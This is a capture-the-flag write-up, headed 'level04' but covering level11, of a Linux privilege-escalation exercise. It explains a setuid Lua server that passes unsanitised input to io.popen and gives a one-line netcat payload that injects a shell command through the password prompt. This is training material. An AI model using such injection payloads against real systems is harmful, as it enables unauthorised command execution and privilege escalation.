# level04

## Scanning

**1. Who are we ?**
```sh
$ id
uid=2011(level11) gid=2011(level11) groups=2011(level11),100(users)
```

**2. Where are we ?** 👀
```sh
$ ls -laR
.:
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
```

## Solution

We found a suspicious file: `/home/user/level11/level11.lua`.

### Privileges

We determined `/home/user/level11/level11.lua` is a prime candidate for privilege escalation because:
- It is owned by `flag11` (our target).
- The group owner is `level11` (which matches our user's group).
- It has the `setuid permission bit` (`s`) set, which grants us the owner's privileges during the program's execution.

This means that, during script execution through the user `level11`, the privilege state is as follows:  
- Real UID: `level11`
- Real GUID: `level11`
- Effective UID: `flag11`
- Effective GUID: `level11`

### Script behaviour(s)

`/home/user/level11/level11.lua` is a [lua](https://www.lua.org/) script.
As it is an interpreted language it can be read as is.
```lua
#!/usr/bin/env lua
local socket = require("socket") -- Init a socket.
local server = assert(socket.bind("127.0.0.1", 5151)) -- Create a server on localhost:5151. If it fails, abort.

function hash(pass)
  --[[
    /!\ https://www.tutorialspoint.com/article/io-popen-function-in-lua-programming
    Executes the given command shell command with EUID privileges in a subprocess and returns a readable file containing it's output.
  ]]
  prog = io.popen("echo "..pass.." | sha1sum", "r") -- Execute 'echo [pass] | sha1sum' in a EUID privileged subprocess.
  data = prog:read("*all") -- Read the entire content of the file (output of the previous command)
  prog:close() -- Close the file.

  data = string.sub(data, 1, 40) -- Keep 40 chars (truncate) from read data.

  return data
end


while 1 do
  local client = server:accept() -- Pause until someone connects.
  client:send("Password: ") -- Ask for password for up to 60 seconds.
  client:settimeout(60)
  local l, err = client:receive() -- Ask to receive some data.
  if not err then
      print("trying " .. l)
      local h = hash(l) -- Attempt to hash the given password.

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then -- Compare the generated hash to the expected one.
          client:send("Erf nope..\n"); -- Failure
      else
          client:send("Gz you dumb*\n") -- Succeed
      end

  end

  client:close() -- Close the opened connection.
end
```

When we try to launch the script we get
```sh
$ /home/user/level11/level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
```

Another program is already running a socket on `127.0.0.1:5151`.  
As suspected, the program was already running. Practical isn't it ?
```sh
$ pgrep -fl /home/user/level11/level11.lua
1852 lua /home/user/level11/level11.lua
```

### Vulnerability

The server does not sanitize our input and our payload in injectedin the `io.popen()` function.
This provides us a Arbitrary Code Execution (ACE) opportunity.

We shortcut the initial `echo` command and strip off the pipe to `sha1sum` by prefixing it with a `#` and thus making it a comment.
That way we gain full control over the command that'll get executed.
```sh
$ echo '; getflag > /tmp/checkflag ; #' | nc localhost 5151; cat /tmp/checkflag
```

And there is our flag ! :)
